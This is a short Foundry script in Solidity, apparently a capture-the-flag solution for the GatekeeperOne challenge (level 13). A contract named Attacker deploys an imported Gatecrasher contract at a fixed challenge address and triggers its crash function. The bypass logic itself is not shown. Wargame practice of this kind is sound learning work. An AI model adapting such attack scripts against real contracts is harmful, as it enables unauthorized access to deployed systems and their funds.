// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel13.sol";
import "../src/level13.sol";

contract Attacker is Script {
    GatekeeperOne level13 = GatekeeperOne(0x068Bf4ecb199d5b28c50Ad74a8152EB0C640626E);

    function run() external {
        vm.startBroadcast();

        Gatecrasher gatecrasher = new Gatecrasher(address(level13));
        gatecrasher.crash();

        vm.stopBroadcast();
    }
}
